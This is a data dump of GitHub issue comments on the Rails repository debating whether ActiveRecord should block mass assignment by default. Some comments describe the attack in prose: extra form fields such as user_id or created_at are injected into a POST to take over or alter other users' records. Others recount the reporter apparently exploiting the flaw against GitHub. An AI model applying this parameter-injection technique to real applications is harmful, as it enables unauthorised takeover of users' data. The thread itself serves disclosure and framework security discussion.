rails/rails/5228/3452651,5228,"Those who don't know methods attr_accesible / protected - check that article out  view at typical situation - middle level rails developer builds website for customer, w/o any special protections in model(Yeah! they don't write it! I have asked few my friends - they dont!) Next, people use this website but if any of them has an idea that developer didnt specify ""attr_accesible"" - hacker can just add an http field in params, e.g. we have pursue's name edition. POST request at pursues#update id = 333 (target's pursues id) pursue['name'] = 'my purses name' pursue['user_id'] = 412(hacker id) if code is scaffolded than likely we got Pursue.find(params[id]).update_attributes(params[pursue]) in the controller. And that is what I worry about. After execution that POST we got hacker owning target's pursue! I don't mean that it is Rails problem, of course not. But let's get it real(Getting Real ok) - most of developers are middle/junior level and most of them don't write important but not very neccessary things tests, role checks etc including topic - attr_accesible how to avoid injections ? What should Rails framework do to force people to keep their rails websites safe? Making attr_accesible necessary field in model? What do you think guys. ",,False
rails/rails/5228/4261345,5228,"I was thinking about generating something like this, unless you pass some kind of option to generator (sometimes you just want to skip  if you know what you're doing) ",,False
rails/rails/5228/4261542,5228,"@friend pointed me to #4062, there is a config setting that can do something like that . Although, based on that discussion I think that the consensus is that it should not be the default. ",,False
rails/rails/5228/4263355,5228,"so, here is what i came up to.  My main concern - is relations.  I hate the idea that some people could rewrite object references by themselves. Nobody should be able to set task[user_id]=hacker_id or sort of Vulnerable references are the main evil because 1) it totally ruins database and leaves no way to fix it back but backups 2) it works clearly. Hacked user won't be able to figure out ""Where is my blog post"" or ""How come this spam post is in my timeline written by me"" (if newpost[user_id]=target_user_to_hack) I suggest to have foreign keys and primary keys protected by default(what are keys can be recognized by ActiveRecord easily). IMO Rails should teach developers to set up so important and vulnerable keys by hands. It is not a handicap for prototyping, just +a few lines of code. But it is all about sane and safe rails apps. I've got a big picture in my head but the backbone is described above. I strongly believe that having keys(references, relations) will make ruby on rails a 20% more awesome. I mean robust ",,False
rails/rails/5228/4263582,5228,"Oh, didn't mention. On my part - I wouldn't support setting all attrs protected. It will cause such big mess! You cannot force every body to read release notes. Stackoverflow will be down. ] + it is dirty solution.  What also we have in model but keys? E.g.  title string  - not vulnerable at all, user is able to edit his comment rating integer - pretty vulnerable but not dangerous account integer - developer who left user[account] open for mass assignment should suffer. Nevermind about him. what else? Do we really need protected fields by default? No. ",,False
rails/rails/5228/4269380,5228,"@friend you dont like 'whitelist' idea - i dont too. But what is your opinion regards relation keys? They are obviously should be defined manually - in most cases. That is why having them protected by default is not a big deal.  And, surely, it should be opt-out-able, e.g.  config.active_record.protect_keys = true ",,False
rails/rails/5228/4281034,5228,Just imagine which power this vulnerability gives in my.. and now in your hands if you get what has happened.  @friend @friend  Y you no care trollface ,,False
rails/rails/5228/4285863,5228,"There're too much trolling going on in this ticket and I'm not sure anymore if you mean anything serious. If you're going to do a bug report or feature request, just stop trolling and try not to be annoying, then the core team will come and check out by themselves. Name calling while trolling doesn't help, trust me. ",,False
rails/rails/5228/4286254,5228,"@friend bugs are serious. This is not only bug report, because this problem is so wide spreaded. postereous, speakerdeck, scribd, github - and I only have started testing. We need to introduce blacklist attributes. MOst of rails apps(from small to github) likely got mass-assignment bugs if they don't user attr_accessible. I just want to attract more attention to reviewing this problem from scratch and calmly decide - what should we do with M As-ment problem. And, if some of you support my idea I could provide fixing pull request. But you ignore this bug, like nothing has happened for a long time. SOrry for not called for trolling, I overplayed ) Everyone, again, express your point please, you are welcome. ",,False
rails/rails/5228/4290842,5228,There was a proposal about changing that flag in #4062 and the consensus is the pros of the default configuration outweigh the pros of the alternative. Thanks! ,,False
rails/rails/5228/4292105,5228,"@friend have you read my post? Did you see vulnerabilities i pointed out in e.g. github? It is not about the flag in configuration, I'm pretty certain. We need to have created_at, updated_at, and references to be protected by default. Whitelist issue has nothing to do with my point Please read issues carefully, because I clearly emphysized that flag is not a panacea ",,False
rails/rails/5228/4292532,5228,"What I want you to see in that thread I mentioned is the way the core team perceives this. You are not discovering anything unknown, we already know this stuff and we like attr protection to work the way it is. ",,False
rails/rails/5228/4292849,5228,"look. this is github, written on rails.   as you see github is vulnerable. Because gh devs are bad? Or who's in charge? Rails are in charge, and blacklist of custom [created_ate, updated_at] is the least we MUST do Really, is there any case when user should be able set created_at by himself? It is timestamp! Why I can set it using just &lt;input name=model[created_at] value='1987...' ?  Again, let's talk about certain vulnerability-case. created_at MUST be protected by default. Am i right? ",,False
rails/rails/5228/4300062,5228,"Rails is not in charge, it is your responsibility to secure your application. It is your responsibility to avoid XSS, to ensure that the user is editing a resource that belongs to him, etc. Rails, however, does a lot of effort to assist you in securing your application as much as it can. That's why you have some protection measures built-in. I don't think we need to special-case anything. The user has a flag to secure by default, I personally think that is enough. I see little benefit in special-casing the timestamps if you have the flag set to false. And I am totally -1 in doing anything fancy with foreign keys because they have of course valid use cases where users can set them. ",,False
rails/rails/5228/4300754,5228,"Perfect response. Rails are not in charge - my question was like, 'why is that'. Surely nobody is fully in charge. But only rails apps got this kind of bug. Yeah, phpists never got so fast prototyping tools so most of them cannot even dream about update_attributes {} and form generation too. Rails has very convinient tools, I agree! attr_accessible is good and must thing for every developer. But for now we got it too unknown. Most of middle level developers forget about the meaning of this tool. Mixes with attr_accessors in ruby itself - so their model gets very unsecure. So you only a little bit support special casing of timestamp.  For first view at the problem of timestamp-overwriting it doesn't seem fatal. But when I have issue/comment written in 3012 year I at least have it number 1 in any timeline orders. That seems ugly to me so I am keen to special case timestamps. Regards foreign keys - I  didn't get why you are ""totally"" -1, and if you got spare time please give me valid use cases if you know some. That will help me in understanding your point fully another way to decide problem - populate using of accessible. Include it in scaffold generated output for model files. Im  pretty sure rubyists will care much more having these lines and one day 4/5 will know+use this declaration. (now 4/5 don't either know or use, that's sad) ",,False
rails/rails/5228/4303341,5228,"@friend I also don't like the idea of doing anything automated with foreign keys or timestamps. That way, people that does not know that they need to use some kind of params protection will be secure in those 2 cases, but it will fail with any other critical field, let's say . @friend what do you think about generating a model class with a comment describing attr_accessible and giving example, something like ",,False
rails/rails/5228/4304367,5228,"@friend  it is your viewpoint. Ok, let's not bother junior devs who will need to think about protection.  But I like your proposal regards model generator. I suggested it as an alternative, this fix will satisfy me. ) ",,False
rails/rails/5228/4311450,5228,"It's 2012. When will people stop believing in ""blacklists""? The default has to be restrictive and the developer has to make sure she/he does acceptable exceptions. It's like with the XSS/sanitize stuff. It will never work the ""blacklist""/""developer should care"" way, imho. At least throw a warning into the debug-log when a model has no attr_accessible defined at all... ",,False
rails/rails/5228/4311476,5228,@friend Is this how you added  curious. ,,False
rails/rails/5228/4311510,5228,@friend plus one Rails is all about conventions. Broken by default is not a good convention. ,,False
rails/rails/5228/4311527,5228,"@friend Man, you look like a kid that wants some attention. Stop trolling and make GitHub a favor — file a private bug request via contact form — that's how non-douchebag people do. I totally agree with @friend — missing  is not Rails' fault but developer's mistake. Generated models could have a friendly comment like @friend said, but in practice I think we don't use generators that much, I thought that's easier just to type . ",,False
rails/rails/5228/4311539,5228,"@friend don't shoot the messenger, dude. ",,False
rails/rails/5228/4311543,5228,"@friend what you say? Every book, every tutorial, every guide tells developers to use generators. Do you create all the test + migration files by hand?! ",,False
rails/rails/5228/4311548,5228,"@friend I might have a bit overreacted — apologies for that. Yet I think giving one example of vulnerability is enough, no need to go through commits and issues over and over screwing things up. ",,False
rails/rails/5228/4311581,5228,"@friend is right, though. Zero-day attacks are a completely inappropriate way of raising awareness of a vulnerability. ",,False
rails/rails/5228/4311587,5228,"@friend I use generators on prototyping stage extensively, but then it simply gets too custom and often beyond scaffolds. It depends on a dev though. ",,False
rails/rails/5228/4311602,5228,"@friend it's primarily a model issue, not a scaffolding issue. attr_accessor is defined inside a model, not in a controller. 100% of all developers I've worked since 2007 use generators to create models + migrations. ",,False
rails/rails/5228/4311604,5228,Two security issues concern me about Rails 1) The defaults not being restrictive 2) Lack of any certification for Gem distribution (imagine if someone got a commit in to some of the most popular gems) ,,False
rails/rails/5228/4311632,5228,@friend rubygems does not even have a popular self-signing implementation as most cpan modules (perl) use. So you can't be sure the gem you've downloaded is the one the author made (not the CIA or another MITM).  1.77 was released iirc around 2002/2003) ,,False
rails/rails/5228/4311662,5228,"@friend RubyGems supports gem signing, I use it for a client of mine  the other hand, 99.999% of gems don't use it -) ",,False
rails/rails/5228/4311673,5228,"@friend iirc only when explicitly specified on the cli (what about bundler?) and as you said....""not very well"" adopted. ",,False
rails/rails/5228/4311723,5228,"In this thread core rails devs get egg on their faces for ignoring a fundamental security concern, and then proceed to complain when the reporter 0days GitHub. ",,False
rails/rails/5228/4311745,5228,Rails devs are not responsible for Rails-powered sites. It's not their fault. ,,False
rails/rails/5228/4311771,5228,See  for my proposal for how to improve the situation. ,,False
rails/rails/5228/4311773,5228,"@friend I don't think that's completely correct, the fix presented in this issue is exactly what the Rails core devs could do, to assist the novice Rails devs. Convention over Configuration means that the Rails devs are actually partially responsible for Rails-powered sites because they establish the convention. ",,False
rails/rails/5228/4311777,5228,@friend Proposal for Improving Mass Assignment - ,,False
rails/rails/5228/4311799,5228,@friend A framework's responsibility is to help programmers write better quality applications. ,,False
rails/rails/5228/4311804,5228,Not to mention that  shouldn't be in model... ,,False
rails/rails/5228/4312751,5228,"It's a worrying issue, made all the more worrying in that I had no idea it existed. I know that the Rails Guys don't see this as a big deal, but I'd ask them to reconsider. This issue affects a lot of projects. I've added ""disable_mass_assignment"" as per the following link and I'm updating my codebase. FWIW, it's a pretty quick job to search for affected fields and add them to the model.  not 100% sure what the ramifications are for models which have different rights according to a user level, but I'll be investigating. One Quick Suggestion  When Attr_Accessible is switched on, the error you get looks something like ... ""Can't mass-assign protected attributes email, name"" Maybe this could be changed to   "" Can't mass-assign protected attributes email, name Add following to your model ( to allow these to be edited in forms Attr_Accessible email, name "" I believe the code to protect the fields should be in the model. I think model attributes should come with security baked in. Not 100% sure how this would work, but it makes the most sense to me. ",,False
rails/rails/5228/4313392,5228,"From homakov ""@friend @friend Y you no care"" Does this guy have to send a teddy bear &amp; flowers? If someone tells me ""Hey you got a severe hole in your app"", and I ignore him, and that hole is then exploited by Anyone (him included), I am to blame.  Someone who cracks my app is an ""a$$hole"", but if they tell me first, and then only crack it to illustrate their point... no.  I am wrong. ",,False
rails/rails/5228/4313545,5228,"@friend his ticket has not been ignored, hasn't it. We disagree about his proposal, which is different. Rails applications have a configuration flag that forces you to declare accessible attributes, the support to prevent these kind of issues is builtin. ",,False
rails/rails/5228/4313803,5228,"Bravo to @friend! What's the shame! When 90% rails apps in the world are vulnerable, ""core team"" says ""We disagree about his proposal"". I have just one question is this framework for ruby developers or only for such ""professionals"" from ""core team""? Open source is so open source in this project... ",,False
rails/rails/5228/4314047,5228,"@friend this proposal would not automagically fix any existing app - it's up to developer to say which fields are protected, there is no easy way to guess that. This can be a problem in all frameworks that allow mass assignment. That said, I'm sure that this needs some farther discussion, but automagically fixing some fields is not an answer and will just not work in practice. ",,False
rails/rails/5228/4314106,5228,"Also, for what it's worth, I proposed a temp solution to raise awareness by adding comments to generated models, to which @friend responded ""1 day ago"" ",,False
rails/rails/5228/4314205,5228,"Dear Rails people, Have you learned nothing? ""Insecure-by-default"" means ""insecure"". Trusting the programmer to fix things up and make them secure has never worked. You guys have reinvented strcpy(). Way to go. ",,False
rails/rails/5228/4314271,5228,"@friend in my opinion, if you don't know how can you handle this automatically, force developer to choose correct option. With current defaults, developer sees ""ok, everything works fine"", and he won't read next chapter about security, he doesn't understand how dangerous can it be! Every wi-fi router after you entered predefined password says ""it's dangeous to use predefined password"", when you login to some admin console with predefined password it says ""You are using default password. Please change it."". You aren't warn that it's dangerous. I believe the problem is the bug was closed after your comment and no new one is created. I think you would like to bury it under show, but thanksfully @friend done the thing that won't be forgotten for a long time ;) ",,False
rails/rails/5228/4314316,5228,"@friend seriously? please don't create any conspiracy theories. The first closed/open thing was done by accident, I reopened ticket seconds later. ",,False
rails/rails/5228/4314329,5228,"For what it's worth, I have commented about this ticket at ",,False
rails/rails/5228/4314470,5228,"@friend ok, sorry, I didn't notice that you're reffering to the other issue, not this one, frankly I missed the magical reopening. I passed it to github guys and closed as was not adding anything into discussion - @friend proved that github is vulnerable and it's referenced here. ",,False
rails/rails/5228/4315699,5228,"@friend wasn't trolling. It's a language barrier filled with relating to memes. His intentions were pure and good. Maybe didn't solve it the best way, but he got the attention and now a proper response. @friend solution is a great one. ",,False
rails/rails/5228/4316760,5228,Nobody here sees the irony in Rails redoing what PHP was ridiculed for for so long? Never. inject. user. input. by. default. ,,False
rails/rails/5228/4317388,5228,"Imo this whole (mass) assignment protectecion does not belong to the model at all, it's a controller thing. I already created an issue for this months ago ",,False
rails/rails/5228/4317692,5228,"github owes @friend an apology. a proper one. and the ones who tried to dismiss him because he doesn't write proper english, should do it in russian. ",,False
rails/rails/5228/4317753,5228,"Nice one @friend Well pointed. GitHub jeez, unblock the man's account! ",,False
rails/rails/5228/4318232,5228,"We should actually be grateful to @friend for bringing this known but not sufficiently addressed problem to attention. Rails should of course be secure by default. Analogous to the XSS situationwe should not allow an insecure (tainted) params hash to be passed straight into our db API, thats almost as bad as being open to SQL injection. The whitelisting/filtering belongs in the controller. Since both @friend and @friend seem to share this view there is a good chance we will get a proper fix in Rails soon. ",,False
rails/rails/5228/4321288,5228,"The entire idea of Rails is to make an application extremely hard to hack even when the programmer has little to none security expertise. Expecting people to fix this themselves is plain silly and goes against the rails way in my opinion. IMO, the entire mass assignment idea should not exist - its way to dangerous and and has no room for error. ",,False
rails/rails/5228/4321374,5228,"@friend I thought the entire idea of rails was to make it easier to build applications, to focus on what your application actually does without having to worry so much about how it does it (at the lowest levels, at least). There's an entire guide explaining how to secure that application once you've built it (or even while you're building it). I agree that certain things (like mass-assignment security) should be enabled by default, but I wouldn't go as far as to say that's the ""entire"" idea of Rails. ",,False
rails/rails/5228/4321543,5228,@friend True - but with one comes the other. Applications get easier to build when you do not have to invest so much time into securing your applications. Rails is also forcing people to think with a certain mindset (which makes you a better programmer in the end). Junior/mid-class developers see that something works with Rails and they think that's it. When you force mass-assignment security - they realize their code is not working and must assign the attributes - you force them to think about security. Starting rails developers should not learn about these issues by having their entire project exploited IMO. Perhaps its not the entire idea of Rails - but Rails already got so much out of the box security build in its certainly a very big part of it. ,,False
rails/rails/5228/4321572,5228,"this is an interesting ticket, it's like ""close the security hole"" ""no, we want developers to close it themselves"" and then they continue calling it a philosophical disagreement after the bug tracker itself is hacked ",,False
rails/rails/5228/4321701,5228,"@friend Oh, I agree, I just wouldn't go as far as saying that's the entire idea of Rails. Personally, I think the best solution would be to immediately release an update that takes one of the approaches given in the first two comments by @friend on this ticket. Either set attr_accessible to nil on ActiveRecordBase or set config.active_record.whitelist_attributes to true by default. Either of these forces safe and sane mass-assignment by ""breaking"" the app if your models aren't safe. I put ""breaking"" in quotes because, realistically, if this one change causes any kind of breakage in your app then it was already broken anyway. ",,False
rails/rails/5228/4322793,5228,Hmm can someone summarize the discussion? Did anybody agree on something? ,,False
rails/rails/5228/4323000,5228,"When I first saw , I already knew it's vulnerable and nobody should write like that. However, this approach is widely used in all Rails guides, and so insecure. Mass-assignment should be disabled by default. ",,False
rails/rails/5228/4323285,5228,-1 to response from rails team. ,,False
rails/rails/5228/4323313,5228,@friend Java-based frameworks are not the answer. They can be pwned too. Take any Jersey app with Spring integration and do the same thing. The only difference is you may have to work a little harder at guessing some of the attributes. I think it's funny that junior/mid-level programmers are being called out so much in this thread. Surely the engineers at GH are not all junior/mid-level guys. Maybe they are and I am just naïve. ,,False
rails/rails/5228/4323438,5228,"I do not think mass-assignment should be disabled by default, but must be disabled on production environment by default. I think this is a good compromissum between developer needs and production security. About filtering what @friend suggested, I think some similar. First, there is need a way to instruct the framework to filter it by default then it needed to be enabled in production mode. I understand every developer is responsible for its stuff but I do not agree why Rails does not help for make its application more secure. Rails is designed with some security solutions, like CSRF stuff and basic protections against XSS. I do not think why we cannot do more step on that way, and make models secure by default. If it is planned well and configured well, then it should not be a pain in the ass. Who needs the original function, they can disable this feature. ",,False
rails/rails/5228/4323627,5228,"@friend my comment above is not fully accurate. I should have said, ""Take any Jersey app with Spring integration where the services interact directly with the entities..."" I have seen many Java programmers do it. ",,False
rails/rails/5228/4323994,5228,It was forced! 6dd6816ce337322e7c267ab1158ac8c80588ccd6 ,,False
rails/rails/5228/4325666,5228,THIS ,,False
rails/rails/5228/4326733,5228,"Protecting attributes from within controllers sounds like a setup to have multiple points of fault.  If I have more than one controller making saves/updates on the same model (ignoring a debate over if that is good design), then I have to remember to protect attributes in multiple controllers.  If I handle mass assignment from the model, there's a single, definitive barrier between submitted params and persistence, irrespective of where that data originated. ",,False
rails/rails/5228/4327289,5228,"@friend exactly. That's what I tried to say dhh in my gist. Controller has nothing to do with unintended params. It doesnt filter. It handles, manages, controls business logic.  IMO You should write your controllers way described below 1) have all critical fields protected/updateable - accessible 2) control saving new record in controller using role checks, dependencies and abilities. Not just by filtering user_id 3) Never simplify business logic for ""update"". People got role checks in ""create"" but trying to manage just ""update_attributes"" in edit and that's why this has happened. If you check role - check it on create and on update. Don't be lazy. sic! ",,False
rails/rails/5228/4328337,5228,"@friend I see your price-list updated on your site D. With you are skills and rails knowledge, you are asking for a junior dev salary in us. ",,False
rails/rails/5228/4329097,5228,"@friend, what if you protect those attributes in , which all other controller inherit from? This would allow you to still set all attributes in your test cases, and you would protect against having multiple points of failure. ",,False
rails/rails/5228/4329211,5228,"Probably you can make a branch like ""rails_for_developers_that_doesnt_read_documentation"" and in that branch you can take off update_attributes, and there you will have a ""secure"" rails framework for people complaining about this issue ) ",,False
rails/rails/5228/4329564,5228,@friend plus one Exactly what I thought. This is a new register_globals. Unbelievable. ,,False
rails/rails/5228/4333203,5228,"FWIW, this behavior isn't unique to Rails.  Or, to be more specific, it isn't unique to ActiveRecord.  If you were to look at other ORMs/ODMs, such as DataMapper, Sequel, MongoMapper, or Mongoid, you could see that mass assignment was allowed by default on any given model, and can be adjusted using a whitelist (or sometimes a blacklist) class method. I don't see anything wrong with this per se.  To disallow mass assignment by default would be a safer default, but it also makes the assumption on what you're doing in your application, and what does and doesn't need to be secured from user tampering.  But it also requires you to be aware of the potential security concern to begin with and be thoughtful of it when designing your models. ",,False
rails/rails/5228/4333899,5228,"@friend If somebody develops an application what will be available from internet for a wide publicity, then it must be protected on all way. I wouldn't like point to GitHub issue what happens if application is not protected. You cannot trust in the internet. If you are a beginner, then read the f_ing manual to yourself, and again, and again, until you understood the security is not an option, but a requirement for your application. I understand some ORMs does not enforce this security setting by default but this page is not an issue page for Mongoid, Sequel, or DataMapper, but it is an issue page for Rails, or to be more specific, for ActiveRecord.. If other ORMs decide make a possible security hole on a non-careful developer's code, then this is their own decision, not the rails developers' one.  Because somebody decides he jumping from the rock without a rope, we do not need to follow that example. We can attach ourself to a rope, and we currently doing it. ",,False
rails/rails/5228/4334145,5228,"There was one problem with this option it wasn't promoted enough. I never saw this option in the generated default config files, and if this (and GitHub) issue does not points me to it, I never set it, even if I use  in my applications. Promoting the security is a very high priority communication job, if there is one channel where we can do it, we need to do it. ",,False
rails/rails/5228/4335260,5228,"@friend You can't protect the user from everything. Having all attributes blacklisted is arguably a safer default, as I said.  It nonetheless makes assumptions about the application.  There might be no need for certain applications (which might not even necessarily be ""web apps"" per se) to have all attributes blacklisted by default.  Some users might even find such a default more burdensome than helpful, depending on what their use case is. The irony of your ""read the f_ing manual"" statement is that the lack thereof is part of the problem here.  Users aren't protecting their attributes either out of ignorance or oversight.  And to be fair, maybe the vulnerability isn't stressed enough in the documentation.  (I haven't looked.)  I'm not arguing against trying to mitigate potential disaster -- I'm all for it -- but I would also argue that if one doesn't truly understand why mass assignment is disabled by default, then he or she is liable to make their models insecure no matter what. And for the users who are truly oblivious, here's what's going to happen anyway ""I can't set  from this form.  Let me just add  to the  array, because that's what will make this action work the way I want it to."" That user doesn't understand what  is for, why they'd want to whitelist attributes, why they need to whitelist attributes, and what can happen if they whitelist the wrong attributes.  They might not even understand that they are whitelisting attributes -- they might think  is some kind of riff on  that adds getters and setters based on their schema. At best, we're really just going to make it a little more difficult for them to screw themselves.  Defaulting to a blacklist is an improvement to security, but no panacea.  And I guess that's what I was getting at in my previous posts.  It seems like some people are mindblown by all this, like allowing you to protect your attributes but not doing it by default is just nuts.  We can go ahead and improve it, but there's still a dozen other gotchas awaiting the unprepared developer. ",,False
rails/rails/5228/4336628,5228,"@friend To be fair, this sorcery also made assumptions for all our Rails apps (for security reasons) 9415935902f120a9bac0bfce7129725a0db38ed3 If you're going to do this (setting ) without knowing what it does, and you can't be arsed to look it up because you're too lazy, then you deserve to get ""hacked"". At this point, the average developer would look up what this does unless they already know, and understand what it's for. The first thing I pop in to the model when I create one is the  method, just to ensure I don't forget, because I likely will since I'm busy implementing other things. Even if you know it exists, like GitHub, apparently even skilled programmers get screwed by Rails' defaults. Thankfully @friend isn't an asshole, but assume he was, he could've done A LOT of damage with automated scripts to GitHub. Also, if this unprepared developer runs in to a lot of gotchas because of having to whitelist stuff, that's good, he or she will learn from them, best way to learn is trial and error. But at least he/she (unless he/she is a total noob, and cba to read docs to clarify what certain things actually do when in doubt and actually uses it wrong) won't be screwed the way GitHub was. Obviously GitHub is at fault here though, not Rails. When I heard the news about the mass-assignment issue + GitHub I thought people were trolling, before I actually read about it. I don't really care whether  blacklists everything by default or not. But from my point of view, by not having it as the default, it has the potential to cause a lot of damage to even experienced developers. Perhaps it's possible to have it on by default, with a flag in  to disable it if it isn't necessary, or the other  way around, since everyone does stuff in the  anyway and will see the option and be like ""oh yeah, *flags it*"". Might just go ahead and do this to be safe Just my two cents. ",,False
rails/rails/5228/4339510,5228,"@friend I like what you say about controllers handling, managing and controlling business logic. Code runs faster in controllers than in models. The TDD fanatics like to put all business logic in the models because it is easier to test, but they apparently don't care about how fast it runs (the client can pay more for that later.) But I disagree about not filtering data in controllers. When you are working with complex data relationships, it may be necessary to place some of the filtering logic in the controller; but that logic is the app developer's responsibility, no special rails constructs are required. People need to realize the examples, even in the books, are simplistic. But sure, why not blacklist all mass assignment and require the dev to use attr_accessible, nothing wrong with that. ",,False
rails/rails/5228/4340406,5228,"@friend Well done ) It's github's admins fault, the man did all he could. It's time people start listening when things like these come by. Again, well done, fully applaud. ",,False
rails/rails/5228/4340407,5228,"Agreed.  Sorry, but all this nonsense about blacklisting by default being annoying is ridiculous.  If attr_accessible is the ""smart"" way to go, then devs should be forced (at the very least encouraged) to use it. On the off chance that they're creating something that requires absolutely no security (seriously?!?), they can deactivate the blacklist for themselves. ",,False
rails/rails/5228/4340498,5228,"Rails is about reasonable conventions over configuration. Reasonable being the key word. In this case @friend proved your conventions are not reasonable. And you ignored him. Lesson learned don't trust rails conventions, they are not reasonable, so if what you just coded works, now sit with the documentation, read it all and check all possible options to find out what do the rails dev's screwed and fix it; if you fail to do it and trust their conventions, they will tell you it's your fault. It was foolish to turn @friend away. Just don't goon wit it. BTW I use the attr_accessible and attr_protected in my apps from the very beginning. Anyway I support what @friend proposed. ",,False
rails/rails/5228/4341128,5228,"@friend @friend was said all argument what I would like, so I would like to reply to just this This is absolute true. But, as a framework developer, I can protect my users from security problems caused by framework if it is possible. Developers are not a secretaries or nurses to I shouldn't assume they can't solve their problems but if I can help them to write better and more secure application then I must do it. ",,False
rails/rails/5228/4341145,5228,"Take a breath, and think naturally... In life, people consciously and loudly choose to tote themselves in the nude.  Even simple fashion is considered a statement attr_accesible birthday_suit # read wildcard/regexp attr_accesible keg, midriff, sixpack, love_handles attr_protected sun_dont_shine, knockers, lingere, knicker_bockers attr_protected bunny_suit # read put the hazmat on the bunny  This is an issue of avoiding the dreaded nipslip or more poignantly protecting baby developers from rapists and pedophiles. Seriously, how much can you expect from a five-month-old? Consider another analogy between escaped strings (which Rails quite aptly handles) and consumables. Cereal and arsenic shouldn't mix; medicines are proscribed by experts; and the LSD's for the adventurous. In the end, you choose, but you can't just allow anyone to shove anything into any orifice. Sensible conventions reflect how we think, and thus make languages like Ruby and fameworks like Rails so wonderfully appealing and empowering. Flexibility shouldn't be compromised, of course I'd be pissed if I had to fight to dress myself. But keep the infant in his diapers and sew the long-forgotten crotch holes in your buddy's pants (coughgithubcough.) After all, mistakes are only human. ;D ",,False
rails/rails/5228/4344920,5228,"i think instead of fighting, rails people should find a nice solution for this problem. please ",,False
rails/rails/5228/4346739,5228,"Solution is in the repo, forcing security is enabled by default. ",,False
rails/rails/5228/4349950,5228,"Couldn't rails automatically use the input fields declared within the form_for block to determine what fields are allowed to be posted?  This could be implemented by automatically inserting a special key at the end of the form, then the controller could only allow the declared parameters through to the actions. ",,False
rails/rails/5228/4350257,5228,"Would it be possible to encode the ids of every element in the form?  Using sha1 or something like that.  The form could also contain something that would assist in the decoding of the ids.   The helper methods (form_for , text_field) would handle the encoding and the controller would automatically decode the params,  so it would be transparent to the user. ",,False
rails/rails/5228/4351018,5228,"@friend No, it is not possible, because the  attribute what is really matters. And it is needed for compute params array. And from SHA1 you cannot decode anything, because you do not needed to name your form elements as same as attribute names - it is just a help for you. But, the form-decoding logic is cannot guess what do you want to get in your form, and if the choosen encoding is decodeable, then hacker can decode it relative easily - so it is not a protection, but security through obscurity - not needed, unusable, and does not matter. And form_for is just generates a HTML form. It is not related to handling incoming parameters. And,you cannot restrict incoming parameters on the level of  framework, because it is an application-dependent thing. ",,False
rails/rails/5228/4351960,5228,"On 06.03.2012 2017, Gabor Garami wrote I think he meant attaching a kind of control sum to each form, to allow controllers to automatically verify if there were any additional fields added to the form by an attacker. --  wrzasa &lt;Q&gt;&lt; ",,False
rails/rails/5228/4367586,5228,"Can someone please point out to me a reasonable use case, for a web application, when you don't need to make sure your POSTed data is exactly what you're expecting? I seem to see people think there are cases where not being forced to be explicit about what you allow, would be... needed, apparently. I'd appreciate a case. ",,False
rails/rails/5228/4368197,5228,"On 07.03.2012 1400, Norv wrote There are cases when you don't care, because your model contains only the fileds that the user is allowed to edit, so an attacker would gain nothing. This is the only use case at least loosely connected with what you asked. I can't see any other. Your question is even more important in case of RoR where my use case is never true, becasue every model contains at least updated_at and created_at and in most cases no user should be allowed edited them. ",,False
rails/rails/5228/4369081,5228,"@friend In the real world, there aren't a lot.  One exception is where the data is coming from a ""trusted"" user, e.g. an admin.  Sure, maybe there's fields you want to secure even from an admin, or maybe not, or maybe you just figure it doesn't matter if they want to hack their own app, if they want to go to those lengths. However, not every model deals with POSTed data, and some do but only indirectly. For example, a project I work on imports XML data from a ""trusted"" source, so in these kinds of models, there's no need for security.  There are numerous models in the project like this.  I'd essentially have to attr_accessible every last column, if the default were for all attributes to be blacklisted by default.  This is somewhat arduous, and is somewhat of a maintainability headache, because if the schema changes later on, I have to add those new fields to the attr_accessible list. If we're going to go with a blacklisted-by-default approach, is there some way for me to auto-whitelist every attribute without having to be so explicit as to type out each one? ",,False
rails/rails/5228/4374607,5228,"Probably a simple configuration should be enough blacklisted-by-default , a config to change it to whitelisted-by-default and the option to change it directly in the model at run time. I don't see the problem really and rails has just maked a fool of itself... PD If you advertise you framework as ""even an idiot can make a page in 30 minutes"" you will end up with a lot of idiots writing pages in 30 minutes... ",,False
rails/rails/5228/4376084,5228,"To me it seems obvious from the start that mass assignment should be disabled by default. Otherwise, you add a field on a table, and you have to remember to block it on the model? If the field would be user-assignable, then of course a form would have to be modified to add an input, and at THIS time, you would modify the model, because it is related to the same change. Yii framework in PHP which is very similar to Rails, blocks alls fields by default since the beginning. If this is common practice in the Rails community, I would never trust a Rails application. This is as bad as SQL injection. ",,False
rails/rails/5228/4376882,5228,"Just received an email from GitHub, perhaps related to this issue ""A security vulnerability was recently discovered that made it possible for an attacker to add new SSH keys to arbitrary GitHub user accounts. This would have provided an attacker with clone/pull access to repositories with read permissions, and clone/pull/push access to repositories with write permissions. As of 553 PM UTC on Sunday, March 4th the vulnerability no longer exists."" ",,False
rails/rails/5228/4391198,5228,"Thank you! @friend I was going to point out the commit above - cjcsuhta already mentioned it. Reversing the switch is possible, for one's particular application. The possibility of different sources for the data getting to the model, than http form input, and needing different treatment for them, tells me again that authorization, filtering of the incoming data, and even validation needed for the data, are not really model issues. They may apply on the model, or be aware of it, but they cannot and should not be handled all at model level, otherwise you can't really have flexibility nor security as needed. The handlers of those actions (i.e. controllers, forms, actions classes) should be responsible, directly or indirectly. On the other hand, since in the case of web form data, there is an always-present need for request filtering, authorization, and validation, I find it more than reasonable to address these concerns at the level of a web framework. If it's at the expense of convenience, then at the expense of convenience. Security &gt;&gt; convenience. At most, validation, from this list, may be disputable as to where it belongs, it may be the choice of a particular framework to handle it more tied to the model itself. I just don't see how could the rest be model matters, and in the same time have a both flexible and secure framework for development. (Nevertheless, the commit pointed out above is IMO a step in the right direction, at least it makes sure the defaults will be saner). Side note I'd say admin is not really an exception in the sense of my question, since checking if the current user is an admin means an authorization check. ",,False
rails/rails/5228/4469007,5228,"@friend Congratulations, your name is now on the media ",,False
rails/rails/5228/4530081,5228,"We developers using Rails should not have to write Merb or 0day the repo in order to get core Rails devs to stop saying ""The emperor DOES SO have clothes!""  Core devs, please change your attitude.  We want newly-generated rails apps to have a setting in the application.rb that by-default turns off mass assignment, unless we reverse that setting in the application.rb or on a model by model basis.  This way it's backwards compatible with existing apps too.  Most of us want this.  Stop making us resort to such tactics for anyone on the core team to listen. ",,False
rails/rails/5228/4539120,5228,"@friend you knocking on the open door. Please read back this issue, the future Rails versions will come with enabled enforcement. ",,False
rails/rails/5228/4550932,5228,"@friend indeed, for this issue... but will our attitudes change enough from this experience so that such tactics won't be necessary with other issues?  I see the attitudes as the root cause that made this issue go so long ignored.  And I realize this is more a social thing than a technical thing, so maybe this isn't the right forum for me to keep talking about it, sorry P ",,False
rails/rails/5228/6222985,5228,"Isn't the question of whether mass assignment is enabled or disabled by default a bit of a red herring? I've just posted a question to this effect at SO, if anyone's interested. ",,False
